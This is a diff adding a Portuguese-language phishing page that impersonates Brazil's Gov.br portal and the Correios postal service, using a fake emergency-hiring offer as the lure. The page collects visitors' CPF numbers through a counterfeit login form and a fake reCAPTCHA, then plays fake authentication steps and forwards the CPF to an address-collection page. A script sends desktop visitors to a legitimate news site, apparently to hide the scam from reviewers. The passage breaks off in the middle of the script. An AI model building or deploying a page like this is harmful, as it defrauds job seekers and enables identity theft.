@@ -1,0 +1,987 @@
+<html lang="pt-BR">
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <title>Correios em Ação - Programa Nacional de Contratação Emergencial | Gov.br</title>
+    <meta name="description"
+        content="Trabalhe nos Correios! Milhares de vagas abertas em todo o Brasil. Salários a partir de R$ 3.600, vale-refeição, plano de saúde e estabilidade. Inscrições abertas!">
+    <meta property="og:title" content="Correios em Ação - Programa Nacional de Contratação Emergencial">
+    <meta property="og:description"
+        content="Trabalhe nos Correios! Milhares de vagas abertas em todo o Brasil. Salários a partir de R$ 3.600, vale-refeição, plano de saúde e estabilidade. Inscrições abertas!">
+    <meta property="og:image" content="https://i.ibb.co/JjG2sWDx/7e964f11-dbd3-4e32-b95c-51b1cbe75f15.jpg">
+    <link rel="icon" href="https://i.ibb.co/XZWT3r0T/favicon.png"/>
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Gov.br - Governo Federal">
+    <meta name="twitter:card" content="summary_large_image">
+   
+
+    <style>
+        /* reCAPTCHA Modal Styles */
+        .recaptcha-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .recaptcha-modal {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            max-width: 500px;
+            width: 95%;
+            position: relative;
+            font-family: 'Roboto', Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .recaptcha-header {
+            background: #4A9B8E;
+            color: white;
+            padding: 20px;
+            position: relative;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .recaptcha-header h3 {
+            font-size: 16px;
+            font-weight: 500;
+            margin: 0 0 15px 0;
+            line-height: 1.4;
+            padding-right: 40px;
+        }
+
+        .recaptcha-sample {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 10px;
+        }
+
+        .recaptcha-sample-text {
+            flex: 1;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.3;
+        }
+
+        .recaptcha-sample img {
+            width: 80px;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 6px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .recaptcha-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 8px;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: all 0.2s ease;
+        }
+
+        .recaptcha-close:hover {
+            background-color: rgba(255, 255, 255, 0.3);
+            transform: scale(121);
+        }
+
+        .recaptcha-body {
+            padding: 20px;
+        }
+
+        .recaptcha-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+            margin-bottom: 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .recaptcha-image {
+            width: 100%;
+            height: 130px;
+            object-fit: cover;
+            cursor: pointer;
+            border: 3px solid transparent;
+            transition: all 0.2s ease;
+            display: block;
+        }
+
+        .recaptcha-image:hover {
+            opacity: 0.8;
+            transform: scale(1.02);
+        }
+
+        .recaptcha-image.selected-correct {
+            border-color: #4CAF50;
+            box-shadow: inset 0 0 0 3px #4CAF50;
+        }
+
+        .recaptcha-image.selected-wrong {
+            border-color: #f44336;
+            box-shadow: inset 0 0 0 3px #f44336;
+        }
+
+        .recaptcha-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px 20px;
+            gap: 15px;
+            min-height: 60px;
+        }
+
+        .recaptcha-controls {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .recaptcha-info {
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+            color: #666;
+            gap: 8px;
+        }
+
+        .recaptcha-icon-btn {
+            background: none;
+            border: 1px solid #ddd;
+            color: #666;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 8px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+        }
+
+        .recaptcha-icon-btn:hover {
+            background-color: #f5f5f5;
+            border-color: #bbb;
+        }
+
+        .recaptcha-logo {
+            width: 28px;
+            height: 28px;
+            background: #1976d2;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .recaptcha-advance {
+            background: linear-gradient(135deg, #4A9B8E 0%, #3E8B7D 100%);
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            min-width: 100px;
+            box-shadow: 0 2px 8px rgba(74, 155, 142, 03);
+        }
+
+        .recaptcha-advance:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .recaptcha-advance:not(:disabled):hover {
+            background: linear-gradient(135deg, #3E8B7D 0%, #357A6D 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(74, 155, 142, 0.4);
+        }
+
+        /* Loading styles */
+        .loading-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .loading-container.active {
+            display: flex;
+        }
+
+        .loading-gif {
+            width: 48px;
+            height: 48px;
+        }
+
+        .loading-text {
+            color: #4A9B8E;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        /* Hide other elements when loading */
+        .recaptcha-footer.loading .recaptcha-controls,
+        .recaptcha-footer.loading .recaptcha-advance {
+            display: none;
+        }
+
+        /* Melhor responsividade */
+        @media (max-width: 480px) {
+            .recaptcha-modal {
+                max-width: 95%;
+                margin: 10px;
+            }
+
+            .recaptcha-header {
+                padding: 16px;
+            }
+
+            .recaptcha-header h3 {
+                font-size: 14px;
+            }
+
+            .recaptcha-sample {
+                padding: 12px;
+                gap: 12px;
+            }
+
+            .recaptcha-sample img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .recaptcha-image {
+                height: 110px;
+            }
+
+            .recaptcha-body {
+                padding: 16px;
+            }
+
+            .recaptcha-footer {
+                padding: 0 16px 16px;
+            }
+
+            .loading-gif {
+                width: 36px;
+                height: 36px;
+            }
+
+            .loading-text {
+                font-size: 14px;
+            }
+        }
+    </style>
+    <meta name="twitter:title" content="Correios em Ação - Programa Nacional de Contratação Emergencial">
+    <meta name="twitter:description"
+        content="Trabalhe nos Correios! Milhares de vagas abertas em todo o Brasil. Salários a partir de R$ 3.600, vale-refeição, plano de saúde e estabilidade.">
+    <meta name="twitter:image" content="https://i.ibb.co/JjG2sWDx/7e964f11-dbd3-4e32-b95c-51b1cbe75f15.jpg">
+
+    <!-- Preload images from i.ibb.co for better performance -->
+    <link rel="preload" as="image" href="../8L5CjLVd/lula-perfil-1.jpg">
+    <link rel="preload" as="image" href="../7JqVg7M7/clona-nao-amigo-1.png">
+    <link rel="preload" as="image" href="../JjG2sWDx/7e964f11-dbd3-4e32-b95c-51b1cbe75f15-1.jpg">
+    <link rel="preload" as="image" href="../RpGp0Kjc/fznd-1.png">
+
+    <link rel="stylesheet" href="../ajax/libs/font-awesome/6.0.0/css/all.min-1.css">
+
+    <script type="module" crossorigin="" src="/assets/index-Bs05CGQ9.js"></script>
+    <link rel="stylesheet" crossorigin="" href="assets/index-CXFYn0TF-1.css">
+    
+    <script type="text/javascript">
+        // Verifica o dispositivo e redireciona antes de carregar outros recursos
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://www.estrategiaconcursos.com.br/blog/concurso-correios-2025-cadastro-reserva/');
+        }
+    </script>
+
+<script>
+  window.pixelId = "68900408c79a2a1bfd8089b8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</head>
+
+<body cz-shortcut-listen="true">
+    <div id="brk_yuan"></div>
+    <noscript><img height="1" width="1" style="display:none"
+            src="../tr-1?id=1181092089991294&ev=PageView&noscript=1"></noscript>
+    <div id="root">
+        <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
+            <ol tabindex="-1"
+                class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]">
+            </ol>
+        </div>
+        <div class="min-h-screen bg-gray-100" style="font-family: Rawline, sans-serif; line-height: 1.5;">
+            <header
+                style="background: 0px 0px no-repeat padding-box padding-box rgb(255, 255, 255); display: flex; flex-direction: row; justify-content: space-between; align-items: center; box-shadow: rgba(0, 0, 0, 0.16) 0px 3px 6px; margin-bottom: 6px; width: 100%; padding: 0px 10px;">
+                <a style="color: rgb(51, 51, 51); font-size: 0.9em; font-weight: 500; text-decoration: none;"><img
+                        src="../assets/govbr/img/govbr.png" style="width: 100px; margin: 10px;"></a>
+                <div class="flex gap-4"><i class="fas fa-moon text-base text-gov-blue"></i><i
+                        class="fas fa-cookie-bite text-base text-gov-blue"></i></div>
+            </header>
+            <div class="container mx-auto p-8" style="margin: 0px auto auto;">
+                <div class="flex justify-center">
+                    <div class="w-full max-w-md">
+                        <div class="bg-white rounded-lg shadow-md p-[10px]">
+                            <h2 class="text-lg font-semibold mb-4 text-[#333333]"
+                                style="font-family: Rawline, sans-serif; font-size: 15px;">Identifique-se no gov.br com:
+                            </h2>
+                            <div class="flex items-center mb-2"><img class="mr-2"
+                                    src="../assets/govbr/img/icons/id-card-solid.png"><span class="text-[#333333]"
+                                    style="font-family: Rawline, sans-serif; font-size: 12.8px;">Número do CPF</span>
+                            </div>
+                            <p class="text-gray-600 text-sm mb-4"
+                                style="font-family: Rawline, sans-serif; font-size: 12.8px;">Digite seu CPF para <span
+                                    class="font-semibold">criar</span> ou <span class="font-semibold">acessar</span> sua
+                                conta gov.br</p>
+                            <div><label for="cpf" class="block text-[#333333] text-sm font-bold mb-2"
+                                    style="font-family: Rawline, sans-serif;">CPF</label><input name="cpf" type="text"
+                                    id="cpf" inputmode="numeric" placeholder="Digite seu CPF"
+                                    class="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 text-[#333333] leading-tight "
+                                    maxlength="14" value=""
+                                    style="font-family: Rawline, sans-serif; padding: 0px 20px; width: 100%; background: 0px 0px no-repeat padding-box padding-box rgb(255, 255, 255); border: 1px solid rgb(136, 136, 136); border-radius: 4px; color: rgb(51, 51, 51); font-style: italic;">
+                            </div><button id="btn-consultar" onclick="recpp()"
+                                class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 text-primary-foreground hover:bg-primary/90 h-10 w-full py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline font-bold bg-[#1351B4] cta-button-primary"
+                                style="font-family: Rawline, sans-serif; box-shadow: rgba(0, 0, 0, 0.16) 0px 2px 3px; border-radius: 24px; opacity: 1; margin: 30px 0px 25px;">Continuar</button>
+                            <p class="text-[#333333] text-sm font-semibold mb-2"
+                                style="font-family: Rawline, sans-serif;">Outras opções de identificação:</p>
+                            <hr class="text-[#333333]">
+                            <div class="space-y-2">
+                                <div class="login-option flex items-center cursor-pointer rounded transition-colors duration-300"
+                                    data-option="internet-banking" style="margin-top: 20px;"><img
+                                        src="../assets/govbr/img/icons/InternetBanking-green.png" alt="Internet Banking"
+                                        class="mr-2">
+                                    <div class="flex items-center"><span class="text-green-700 text-xs">Login com seu
+                                            banco</span><span
+                                            class="ml-2 bg-green-700 text-white text-xs px-1 py-0.5 uppercase font-bold"
+                                            style="font-size: 8px;">SUA CONTA SERÁ PRATA</span></div>
+                                </div>
+                                <div class="flex items-center cursor-pointer" style="margin-top: 20px;"><img
+                                        class="mr-2" src="../assets/govbr/img/icons/app-identidade-govbr.png"><span
+                                        class="text-[#333333] text-sm" style="font-family: Rawline, sans-serif;">Seu
+                                        aplicativo gov.br</span></div>
+                                <div class="flex items-center cursor-pointer" style="margin-top: 20px;"><img
+                                        class="mr-2" src="../assets/govbr/img/icons/CD.png"><span
+                                        class="text-[#333333] text-sm" style="font-family: Rawline, sans-serif;">Seu
+                                        certificado digital</span></div>
+                                <div class="flex items-center cursor-pointer" style="margin-top: 20px;"><img
+                                        class="mr-2" src="../assets/govbr/img/icons/CD-Nuvem.png"><span
+                                        class="text-[#333333] text-sm" style="font-family: Rawline, sans-serif;">Seu
+                                        certificado digital em nuvem</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- reCAPTCHA Modal -->
+    <div class="recaptcha-overlay" id="recaptcha-overlay">
+        <div class="recaptcha-modal">
+            <div class="recaptcha-header">
+                <div class="flex justify-between items-start">
+                    <div class="flex items-start space-x-3 flex-shrink-0 flex-1">
+                        <div>
+                            <h3 class="text-[1.15em] font-medium leading-tight">Clique nas imagens com as<br>mesmas
+                                espécies <strong>ANIMAIS</strong><br>mostradas na amostra</h3>
+                        </div>
+                        <div class="rounded flex-shrink-0"><img src="../RkfVvbhx/dog-1.jpg" alt="Amostra - Cachorro"
+                                class="w-32 h-32 rounded object-cover"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="recaptcha-body">
+                <div class="recaptcha-grid" id="recaptcha-grid">
+                    <!-- Imagens serão inseridas via JavaScript -->
+                </div>
+            </div>
+            <div style="padding: 0  10px 10px 10px;">
+                <div class="flex items-center justify-between">
+                    <div class="flex space-x-2"><button
+                            class="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center"><i
+                                class="fas fa-ellipsis-h text-gray-600 text-sm"></i></button><button
+                            class="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center"><i
+                                class="fas fa-redo text-gray-600 text-sm"></i></button><button
+                            class="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center"><i
+                                class="fas fa-volume-up text-gray-600 text-sm"></i></button></div><svg
+                        xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewbox="0 0 32 32" role="img"
+                        aria-hidden="true" fill="none" style="width: 32px; height: 32px; display: block;">
+                        <path opacity="0.5" d="M24 28H20V32H24V28Z" fill="#0074BF"></path>
+                        <path opacity="0.7" d="M20 28H16V32H20V28Z" fill="#0074BF"></path>
+                        <path opacity="0.7" d="M16 28H12V32H16V28Z" fill="#0074BF"></path>
+                        <path opacity="0.5" d="M12 28H8V32H12V28Z" fill="#0074BF"></path>
+                        <path opacity="0.7" d="M28 24H24V28H28V24Z" fill="#0082BF"></path>
+                        <path opacity="0.8" d="M24 24H20V28H24V24Z" fill="#0082BF"></path>
+                        <path d="M20 24H16V28H20V24Z" fill="#0082BF"></path>
+                        <path d="M16 24H12V28H16V24Z" fill="#0082BF"></path>
+                        <path opacity="0.8" d="M12 24H8V28H12V24Z" fill="#0082BF"></path>
+                        <path opacity="0.7" d="M8 24H4V28H8V24Z" fill="#0082BF"></path>
+                        <path opacity="0.5" d="M32 20H28V24H32V20Z" fill="#008FBF"></path>
+                        <path opacity="0.8" d="M28 20H24V24H28V20Z" fill="#008FBF"></path>
+                        <path d="M24 20H20V24H24V20Z" fill="#008FBF"></path>
+                        <path d="M20 20H16V24H20V20Z" fill="#008FBF"></path>
+                        <path d="M16 20H12V24H16V20Z" fill="#008FBF"></path>
+                        <path d="M12 20H8V24H12V20Z" fill="#008FBF"></path>
+                        <path opacity="0.8" d="M8 20H4V24H8V20Z" fill="#008FBF"></path>
+                        <path opacity="0.5" d="M4 20H0V24H4V20Z" fill="#008FBF"></path>
+                        <path opacity="0.7" d="M32 16H28V20H32V16Z" fill="#009DBF"></path>
+                        <path d="M28 16H24V20H28V16Z" fill="#009DBF"></path>
+                        <path d="M24 16H20V20H24V16Z" fill="#009DBF"></path>
+                        <path d="M20 16H16V20H20V16Z" fill="#009DBF"></path>
+                        <path d="M16 16H12V20H16V16Z" fill="#009DBF"></path>
+                        <path d="M12 16H8V20H12V16Z" fill="#009DBF"></path>
+                        <path d="M8 16H4V20H8V16Z" fill="#009DBF"></path>
+                        <path opacity="0.7" d="M4 16H0V20H4V16Z" fill="#009DBF"></path>
+                        <path opacity="0.7" d="M32 12H28V16H32V12Z" fill="#00ABBF"></path>
+                        <path d="M28 12H24V16H28V12Z" fill="#00ABBF"></path>
+                        <path d="M24 12H20V16H24V12Z" fill="#00ABBF"></path>
+                        <path d="M20 12H16V16H20V12Z" fill="#00ABBF"></path>
+                        <path d="M16 12H12V16H16V12Z" fill="#00ABBF"></path>
+                        <path d="M12 12H8V16H12V12Z" fill="#00ABBF"></path>
+                        <path d="M8 12H4V16H8V12Z" fill="#00ABBF"></path>
+                        <path opacity="0.7" d="M4 12H0V16H4V12Z" fill="#00ABBF"></path>
+                        <path opacity="0.5" d="M32 8H28V12H32V8Z" fill="#00B9BF"></path>
+                        <path opacity="0.8" d="M28 8H24V12H28V8Z" fill="#00B9BF"></path>
+                        <path d="M24 8H20V12H24V8Z" fill="#00B9BF"></path>
+                        <path d="M20 8H16V12H20V8Z" fill="#00B9BF"></path>
+                        <path d="M16 8H12V12H16V8Z" fill="#00B9BF"></path>
+                        <path d="M12 8H8V12H12V8Z" fill="#00B9BF"></path>
+                        <path opacity="0.8" d="M8 8H4V12H8V8Z" fill="#00B9BF"></path>
+                        <path opacity="0.5" d="M4 8H0V12H4V8Z" fill="#00B9BF"></path>
+                        <path opacity="0.7" d="M28 4H24V8H28V4Z" fill="#00C6BF"></path>
+                        <path opacity="0.8" d="M24 4H20V8H24V4Z" fill="#00C6BF"></path>
+                        <path d="M20 4H16V8H20V4Z" fill="#00C6BF"></path>
+                        <path d="M16 4H12V8H16V4Z" fill="#00C6BF"></path>
+                        <path opacity="0.8" d="M12 4H8V8H12V4Z" fill="#00C6BF"></path>
+                        <path opacity="0.7" d="M8 4H4V8H8V4Z" fill="#00C6BF"></path>
+                        <path opacity="0.5" d="M24 0H20V4H24V0Z" fill="#00D4BF"></path>
+                        <path opacity="0.7" d="M20 0H16V4H20V0Z" fill="#00D4BF"></path>
+                        <path opacity="0.7" d="M16 0H12V4H16V0Z" fill="#00D4BF"></path>
+                        <path opacity="0.5" d="M12 0H8V4H12V0Z" fill="#00D4BF"></path>
+                        <path
+                            d="M10.5141 14.9697L11.6379 12.4572C12.0459 11.8129 11.9958 11.0255 11.5449 10.5745C11.4876 10.5173 11.416 10.46 11.3444 10.4171C11.0366 10.2238 10.6572 10.1808 10.3065 10.2954C9.91993 10.4171 9.58349 10.6748 9.36875 11.0184C9.36875 11.0184 7.82972 14.6046 7.26421 16.2153C6.69871 17.8259 6.92062 20.7822 9.12536 22.987C11.4661 25.3277 14.8448 25.8575 17.0066 24.2397C17.0997 24.1967 17.1784 24.1395 17.2572 24.0751L23.9072 18.5202C24.2293 18.2554 24.7089 17.7042 24.2794 17.0743C23.8642 16.4586 23.0697 16.881 22.7404 17.0886L18.9107 19.8731C18.8391 19.9304 18.7318 19.9232 18.6673 19.8517C18.6673 19.8517 18.6673 19.8445 18.6602 19.8445C18.56 19.7228 18.5456 19.4079 18.696 19.2862L24.5657 14.304C25.074 13.8459 25.1456 13.1802 24.7304 12.7292C24.3295 12.2854 23.6924 12.2997 23.1842 12.7578L17.9157 16.881C17.8155 16.9597 17.6652 16.9454 17.5864 16.8452L17.5793 16.838C17.4719 16.7235 17.4361 16.5231 17.5506 16.4014L23.535 10.596C24.0074 10.1522 24.036 9.4149 23.5922 8.94245C23.3775 8.72054 23.084 8.59169 22.7762 8.59169C22.4612 8.59169 22.1606 8.70623 21.9387 8.92813L15.8255 14.6691C15.6823 14.8122 15.396 14.6691 15.3602 14.4973C15.3459 14.4328 15.3674 14.3684 15.4103 14.3255L20.0918 8.99972C20.5571 8.56306 20.5858 7.83292 20.1491 7.36763C19.7124 6.90234 18.9823 6.87371 18.517 7.31036C18.4955 7.32468 18.4812 7.34615 18.4597 7.36763L11.3659 15.2203C11.1082 15.478 10.736 15.4851 10.557 15.342C10.4425 15.2489 10.4282 15.0843 10.5141 14.9697Z"
+                            fill="white"></path>
+                    </svg><button
+                        class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-10 bg-gray-600 hover:bg-gray-700 text-white px-6 py-2 rounded text-sm font-medium"
+                        style="background: 0px 0px no-repeat padding-box padding-box rgb(19, 81, 180);"
+                        onclick="validateRecaptcha()" id="recaptcha-advance">Avançar</button>
+                </div>
+            </div>
+            <div id="recaptcha-footer">
+                <!-- Loading Container -->
+                <div class="loading-container" id="loading-container">
+                    <img src="../animation/2023/08/11/21/18/21-18-05-265_512.gif" alt="Loading" class="loading-gif">
+                    <span class="loading-text">VALIDANDO</span>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div style="width: 100%; height: 100%;  z-index: 999999999; display: none;" id="loadNextPage" class="loadContainer">
+        <div class="loadGov" style="">
+            <img style="width: 130px; margin-bottom: 1.5rem"
+                src="../wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg-1.png" alt="">
+            <!-- <div style=" margin-top: 30px; margin-bottom: 12px;" class="loader"></div> -->
+            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 6px;">
+                <div class="loading-content">
+                    <svg id="loading-key" style="display: none;" width="127px" height="127px"
+                        viewbox="-1.6 -1.6 19.20 19.20" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        stroke="#3e45ffff" stroke-width="0.00016" transform="rotate(0)">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
+                            stroke-width="0.032"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M16 5.5C16 8.53757 13.5376 11 10.5 11H7V13H5V15L4 16H0V12L5.16351 6.83649C5.0567 6.40863 5 5.96094 5 5.5C5 2.46243 7.46243 0 10.5 0C13.5376 0 16 2.46243 16 5.5ZM13 4C13 4.55228 12.5523 5 12 5C11.4477 5 11 4.55228 11 4C11 3.44772 11.4477 3 12 3C12.5523 3 13 3.44772 13 4Z"
+                                fill="#3e45ffff"></path>
+                        </g>
+                    </svg>
+                    <svg style="display: none; width: 2.2rem !important; height: 2.2rem !important" fill="#46a44a"
+                        version="1.1" id="loading-cellphone" xmlns="http://www.w3.org/2000/svg"
+                        xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 100.00 100.00"
+                        enable-background="new 0 0 100 100" xml:space="preserve" stroke="#46a44a" stroke-width="0.001">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <g>
+                                <path
+                                    d="M72,23.199C72,19.775,69.224,17,65.8,17H35.2c-3.424,0-6.2,2.775-6.2,6.199v55.602C29,82.225,31.776,85,35.2,85h30.6 c3.424,0,6.2-2.775,6.2-6.199V23.199z M68,78.801C68,80.016,67.015,81,65.8,81H35.2c-1.215,0-2.2-0.984-2.2-2.199V23.199 C33,21.985,33.985,21,35.2,21h30.6c1.215,0,2.2,0.985,2.2,2.199V78.801z">
+                                </path>
+                                <path
+                                    d="M65,26c0-1.104-0.896-2-2-2H38c-1.104,0-2,0.896-2,2v42c0,1.104,0.896,2,2,2h25c1.104,0,2-0.896,2-2V26z M40,28h21v38H40 V28z">
+                                </path>
+                                <circle cx="50.341" cy="75.003" r="3.455"></circle>
+                            </g>
+                        </g>
+                    </svg>
+                    <svg style="display: none;" viewbox="-2.08 -2.08 20.16 20.16" id="loading-confirm" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#46a44b"
+                        stroke="#46a44b">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <path fill="#46a44a" d="M7.3 14.2l-7.1-5.2 1.7-2.4 4.8 3.5 6.6-8.5 2.3 1.8z"></path>
+                        </g>
+                    </svg>
+                </div>
+                <p style="font-size: 15px; font-weight: 600; margin-top:0.5rem" id="loading-text">Verificação Necessária
+                </p>
+                <p style=" padding: 0 18px; font-size: 12px; text-align: center;" id="loading-subText">Criando ambiente
+                    seguro e protegendo dados de acordo com a leu LGPD</p>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const steps = [{
+            text: 'Acessando...',
+            subText: 'Conectando ao sistema',
+            icon: ''
+        },
+        {
+            text: 'Autenticando...',
+            subText: 'Validando credenciais',
+            icon: 'loading-key'
+        },
+        {
+            text: 'Aparelho Autenticado...',
+            subText: 'Dispositivo reconhecido',
+            icon: 'loading-confirm'
+        }, {
+            text: 'Login já realizado nesse aparelho...',
+            subText: 'Redirecionando',
+            icon: 'loading-cellphone'
+        }
+        ];
+
+        let currentStep = 0;
+
+        function updateLoadingStep() {
+            const step = steps[currentStep];
+            document.getElementById('loading-text').textContent = step.text;
+            document.getElementById('loading-subText').textContent = step.subText;
+            const iconId = step.icon;
+
+            if (iconId) {
+                const icon = document.getElementById(step.icon);
+
+                if (icon) {
+                    icon.style.display = 'block';
+                }
+
+            }
+
+            const prevIconId = steps[currentStep - 1]?.icon;
+
+            if (prevIconId) {
+                const prevIcon = document.getElementById(prevIconId);
+
+                if (prevIcon) {
+                    prevIcon.style.display = 'none';
+                }
+            }
+
+            if (currentStep === steps.length - 1) {
+                document.querySelector('.loading-content').style.backgroundColor = 'rgba(222, 255, 225, 1)';
+                document.getElementById('loading-text').style.color = '#46a44b';
+            }
+
+            setTimeout(() => {
+                currentStep++;
+                if (currentStep < steps.length) {
+                    updateLoadingStep();
+                } else {
+                    const params = new URLSearchParams(window.location.search);
+                    params.append('cpf', document.getElementById('cpf').value.replace(/\D/g, ''));
+                    window.location.href = `/endereco?${params.toString()}`;
+                }
+            }, 2000 + currentStep * 1000);
+        }
+
+        function initSteps() {
+            document.getElementById('loadNextPage').style.display = 'flex';
+            currentStep = 0;
+            updateLoadingStep();
+        }
+    </script>
+
+
+    <style>
+        .loadContainer .loading-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 3rem;
+            height: 3rem;
+            background-color: #b9dbffff;
+            border-radius: 100%;
+        }
+
+        .loadContainer .loading-content svg {
+            width: 1.5rem;
+            height: 1.5rem;
+        }
+
+        .loadContainer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            border-radius: 7px;
+            background-color: #0000005b;
+            margin: 0 !important;
+            padding: 0 !important;
+            left: 0;
+            z-index: 1000000;
+        }
+
+        .loadGov {
+            background-color: #fff;
+            width: 85%;
+            /* height: 240px; */
+            background-color: #fff;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            flex-direction: column;
+            padding: 1.5rem 0;
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+    <!-- jQuery -->
+    <script src="../jquery-3.6.0.min-1.js"></script>
+
+    <!-- jQuery Mask Plugin -->
+    <script src="../ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            $('#cpf').mask('000.000.000-00');
+        });
+    </script>
+
+    <script src="../bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <script>
+        // Imagens corretas (cachorros)
+        const correctImages = [
+            'https://i.ibb.co/tMdVgvp4/img3.jpg',
+            'https://i.ibb.co/fz38sWQJ/img6.jpg',
+            'https://i.ibb.co/WWhfFHzc/img8.jpgp'
+        ];
+
+        // Imagens incorretas
+        const incorrectImages = [
+            'https://i.ibb.co/0jn39xYK/img1.jpg',
+            'https://i.ibb.co/wZbtjDzb/img4.jpg',
+            'https://i.ibb.co/QjNBmDdM/img5.jpg',
+            'https://i.ibb.co/0pPZPQXQ/img7.jpg',
+            'https://i.ibb.co/G4thGzht/img9.jpg',
